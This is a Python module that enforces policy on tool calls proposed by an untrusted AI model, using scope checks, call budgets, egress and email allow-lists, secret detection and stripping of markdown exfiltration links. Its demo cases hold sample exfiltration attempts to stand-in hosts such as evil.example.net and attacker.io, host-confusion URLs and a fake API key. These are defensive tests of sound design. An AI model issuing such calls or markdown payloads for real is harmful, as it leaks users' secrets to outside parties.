"""Policy enforcement point (PEP) and egress filter for model-proposed tool calls.

Standard library only. The model is untrusted: it proposes tool calls, and this
deterministic code decides. Run: python 01_policy_enforcement_and_egress_filter.py
"""
from __future__ import annotations

import re
from dataclasses import dataclass
from urllib.parse import urlparse

# --- Policy as data (would live in version control and be signed in production) ---
POLICY = {
    "tools": {
        "search_kb": {"scopes": {"kb:read"}, "consequential": False, "max_calls": 5},
        "send_email": {"scopes": {"mail:send"}, "consequential": True, "max_calls": 1},
        "fetch_url": {"scopes": {"net:fetch"}, "consequential": False, "max_calls": 3},
    },
    "egress_allow": {"docs.example.com", "api.example.com"},
    "email_domains_allow": {"example.com"},
    "max_arg_chars": 2000,
}

SECRET_PATTERNS = [
    re.compile(r"sk-[A-Za-z0-9]{16,}"),  # provider-style key
    re.compile(r"AKIA[0-9A-Z]{16}"),  # cloud access key id shape
    re.compile(r"\b\d{3}-\d{2}-\d{4}\b"),  # US SSN shape (illustrative)
]


@dataclass
class Principal:
    user: str
    tenant: str
    scopes: set


@dataclass
class Decision:
    allow: bool
    reason: str
    needs_approval: bool = False


def host_allowed(url: str) -> bool:
    p = urlparse(url)
    if p.scheme != "https" or not p.hostname:
        return False
    if p.username or p.password:  # user:pass@host tricks
        return False
    host = p.hostname.lower()
    return host in POLICY["egress_allow"]  # exact match, not endswith


def contains_secret(text: str) -> bool:
    return any(p.search(text) for p in SECRET_PATTERNS)


def decide(principal: Principal, tool: str, args: dict, calls_so_far: dict) -> Decision:
    spec = POLICY["tools"].get(tool)
    if spec is None:
        return Decision(False, "unknown tool")
    if not spec["scopes"] <= principal.scopes:
        return Decision(False, "caller lacks scope")  # user's authority, not model's
    if calls_so_far.get(tool, 0) >= spec["max_calls"]:
        return Decision(False, "per-request call budget exceeded")
    blob = " ".join(str(v) for v in args.values())
    if len(blob) > POLICY["max_arg_chars"]:
        return Decision(False, "argument too large")
    if contains_secret(blob):
        return Decision(False, "secret-shaped value in arguments")
    if tool == "fetch_url" and not host_allowed(args.get("url", "")):
        return Decision(False, "destination not on egress allow-list")
    if tool == "send_email":
        domain = args.get("to", "").rsplit("@", 1)[-1].lower()
        if domain not in POLICY["email_domains_allow"]:
            return Decision(False, "recipient domain not allowed")
    if spec["consequential"]:
        return Decision(True, "allowed after human approval", needs_approval=True)
    return Decision(True, "allowed")


def render_markdown_safe(md: str) -> str:
    """Strip remote images and non-allow-listed links (markdown exfiltration channel)."""
    def img(m):
        return "[image removed]"

    def link(m):
        text, url = m.group(1), m.group(2)
        return m.group(0) if host_allowed(url) else f"{text} [link removed]"

    md = re.sub(r"!\[[^\]]*\]\([^)]*\)", img, md)
    return re.sub(r"\[([^\]]+)\]\(([^)]+)\)", link, md)


if __name__ == "__main__":
    alice = Principal("alice", "tenant-a", {"kb:read", "net:fetch", "mail:send"})
    bob = Principal("bob", "tenant-a", {"kb:read"})
    cases = [
        (alice, "search_kb", {"q": "refund policy"}),
        (alice, "fetch_url", {"url": "https://docs.example.com/a"}),
        (alice, "fetch_url", {"url": "https://evil.example.net/?d=secret"}),
        (alice, "fetch_url", {"url": "https://docs.example.com.evil.net/x"}),
        (alice, "fetch_url", {"url": "https://docs.example.com@evil.net/x"}),
        (alice, "fetch_url", {"url": "http://docs.example.com/a"}),
        (alice, "send_email", {"to": "cfo@example.com", "body": "summary"}),
        (alice, "send_email", {"to": "x@attacker.io", "body": "summary"}),
        (alice, "send_email", {"to": "cfo@example.com", "body": "key sk-ABCDEFGHIJKLMNOP1234"}),
        (bob, "send_email", {"to": "cfo@example.com", "body": "hi"}),
        (alice, "delete_all", {}),
    ]
    for who, tool, args in cases:
        d = decide(who, tool, args, {})
        flag = "ALLOW" if d.allow else "DENY "
        extra = " (approval)" if d.needs_approval else ""
        print(f"{flag} {who.user:5} {tool:10} {d.reason}{extra}")

    md = ("Summary. ![x](https://evil.example.net/p.png?q=SECRET) "
          "See [docs](https://docs.example.com/a) and [click](https://evil.example.net/?q=SECRET).")
    print(render_markdown_safe(md))
